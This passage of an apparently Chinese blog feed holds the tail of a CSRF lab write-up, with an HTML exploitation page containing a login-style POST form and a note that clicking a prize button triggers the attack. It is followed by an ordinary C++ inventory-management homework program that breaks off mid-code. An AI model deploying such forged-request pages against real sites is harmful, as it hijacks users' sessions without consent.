attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSRF利用场所<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>user:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>pass:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>OK<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sub<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200504152521283.png" alt="在这里插入图片描述" loading="lazy"><br>报错什么的基本在get类型的代码上解决完了，这个直接<br><img src="https://img-blog.csdnimg.cn/20200504153101827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200504153139137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点击“我要中奖了”，就成功了。<br><img src="https://img-blog.csdnimg.cn/20200504153307613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++超市库存管理系统期末作业</title>
      <link href="/posts/bf2c59e1/"/>
      <url>/posts/bf2c59e1/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>期末前的一个作业，忙了好久才做好，真是要吐了。<br>下面是个流程图，相关功能我写的还算清晰，最后还加上了按任意键继续的代码和清屏代码。只是，还没有修改商品的功能，做了这些已经快要废了。还有考试，不做了不做了。就先这样子吧。百度的我都快吐了，看代码，查代码，写代码，从这点看出来我以后可能不适合做开发。哈哈。不说了不说了，考试真的慌啊。狗头保命。<br><img src="https://img-blog.csdnimg.cn/20200610192009667.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//main.cpp</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cassert></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iomanip></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;conio.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//仓库管理员类</span><span class="token keyword">class</span> <span class="token class-name">admin</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span><span class="token operator">:</span>string name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//仓库货架类</span><span class="token keyword">class</span> <span class="token class-name">shelf</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">shelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span><span class="token operator">:</span>admin men<span class="token punctuation">;</span><span class="token comment">//管理员</span>string storeNo<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>string kinds<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//electrical class</span><span class="token keyword">class</span> <span class="token class-name">ele</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">ele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span><span class="token operator">:</span>string name<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price<span class="token punctuation">;</span><span class="token comment">//价格</span>shelf sh<span class="token punctuation">;</span><span class="token comment">//所属货架</span><span class="token keyword">long</span> count<span class="token punctuation">;</span><span class="token comment">//商品数量</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//管理(组合类)</span><span class="token keyword">class</span> <span class="token class-name">mana</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">mana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token function">first_face</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//首页</span><span class="token keyword">void</span> <span class="token function">in_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//入库</span><span class="token keyword">void</span> <span class="token function">out_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 出库</span><span class="token keyword">void</span> <span class="token function">select_ele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查询</span><span class="token keyword">void</span> <span class="token function">select_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//按商品名称查询</span><span class="token keyword">void</span> <span class="token function">select_price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//按商品价格查询</span><span class="token keyword">void</span> <span class="token function">select_kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//按产地查询</span><span class="token keyword">void</span> <span class="token function">call_break</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//商品报损</span><span class="token keyword">private</span><span class="token operator">:</span>ele aele<span class="token punctuation">;</span>shelf ashelf<span class="token punctuation">;</span>admin abs<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//电器类默认构造函数</span>ele<span class="token operator">::</span><span class="token function">ele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">sh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>name <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span><span class="token comment">//商品名</span>price <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token comment">//价格</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//商品数量</span><span class="token punctuation">&#125;</span><span class="token comment">//仓库货架类默认构造函数</span>shelf<span class="token operator">::</span><span class="token function">shelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">men</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>storeNo <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span><span class="token comment">//仓库编号</span>kinds <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span><span class="token comment">//生产产地</span>shelfNo <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token punctuation">&#125;</span><span class="token comment">//仓库管理员类</span>admin<span class="token operator">::</span><span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>name <span class="token operator">=</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//管理类默认构造函数</span>mana<span class="token operator">::</span><span class="token function">mana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">aele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ashelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> mana<span class="token operator">::</span><span class="token function">first_face</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t>>>>>>>>>>>>>>>>超市库存货物管理系统&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\t\t"</span><span class="token operator">&lt;&lt;</span>endl<span class="token operator">&lt;&lt;</span><span class="token string">"\t--------------------------系统菜单显示如下---------------------\t"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥ 1. 商品入库 ￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥ 2. 商品出库 ￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥ 3. 查询统计 ￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥ 4. 商品报损 ￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t￥￥ 5. 退出系统 ￥￥"</span><span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t---------------------------------------------------"</span> <span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span>endl <span class="token operator">&lt;&lt;</span><span class="token string">"\t\t"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//入库</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">in_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>string name<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price<span class="token punctuation">;</span><span class="token comment">//价格</span>string storeNo<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>string kinds<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"商品入库，请输入相关信息 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品名称 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> name<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品价格 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> price<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品数量 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> count<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t仓库编号 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> storeNo<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t生产产地 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> kinds<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t货架编号 : "</span> <span class="token punctuation">;</span>cin <span class="token operator">>></span> shelfNo<span class="token punctuation">;</span>ofstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">,</span> ios<span class="token operator">::</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t该商品已经入库......."</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 出库</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">out_storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>string name<span class="token punctuation">;</span><span class="token comment">//商品名</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品出库，输入出库商品信息 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t商品名称 : "</span><span class="token punctuation">;</span>cin <span class="token operator">>></span> name<span class="token punctuation">;</span>ifstream <span class="token function">storeFile</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ofstream <span class="token function">storeFile1</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t仓存为空!!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>string name1<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price1<span class="token punctuation">;</span><span class="token comment">//价格</span>string storeNo1<span class="token punctuation">;</span><span class="token comment">//仓库编号</span>string kinds1<span class="token punctuation">;</span><span class="token comment">//生产产地</span>string shelfNo1<span class="token punctuation">;</span><span class="token comment">//货架号</span><span class="token keyword">long</span> count1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//商品数量</span>ofstream <span class="token function">tempFile</span><span class="token punctuation">(</span><span class="token string">"j4y.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>storeFile <span class="token operator">>></span> name1 <span class="token operator">>></span> price1 <span class="token operator">>></span> count1 <span class="token operator">>></span> storeNo1 <span class="token operator">>></span> kinds1 <span class="token operator">>></span> shelfNo1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>name1<span class="token operator">==</span>name<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>tempFile <span class="token operator">&lt;&lt;</span> <span class="token function">setiosflags</span><span class="token punctuation">(</span>ios<span class="token operator">::</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> name1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> price1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> count1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> storeNo1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> kinds1 <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token operator">&lt;&lt;</span> shelfNo1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>tempFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t仓库中没有这种商品!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ofstream <span class="token function">storeFile1</span><span class="token punctuation">(</span><span class="token string">"m0re.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ifstream <span class="token function">tempFile1</span><span class="token punctuation">(</span><span class="token string">"j4y.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1 <span class="token operator">&lt;&lt;</span> tempFile1<span class="token punctuation">.</span><span class="token function">rdbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>storeFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tempFile1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t这些商品已经出库, 请仔细检查!!!"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//查询</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">select_ele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t============================================================="</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| 商 品 查 询 ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| 1. 按商品名称查询 ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| 2. 按商品价格查询 ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| 3. 按产地查询 ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| 4. 返回 ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t|| ||"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token operator">&lt;&lt;</span> <span class="token string">"\t============================================================="</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t\t"</span><span class="token punctuation">;</span><span class="token keyword">char</span> select <span class="token operator">=</span> <span class="token function">getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>select<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string">'1'</span><span class="token operator">:</span><span class="token function">select_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'2'</span><span class="token operator">:</span><span class="token function">select_price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'3'</span><span class="token operator">:</span><span class="token function">select_kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'4'</span><span class="token operator">:</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//按商品名称查询</span><span class="token keyword">void</span> mana<span class="token operator">::</span><span class="token function">select_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"\t按商品名查询 : "</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl <span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\t输入商品名 : "</span><span class="token punctuation">;</span>string name<span class="token punctuation">;</span>cin <span class="token operator">>></span> name<span class="token punctuation">;</span>string name1<span class="token punctuation">;</span><span class="token comment">//商品名</span><span class="token keyword">double</span> price1<span class="token punctuation">;</span><span class="token comment">//价格</span>string storeNo1<span class="token punctuation">;</span><span class="token 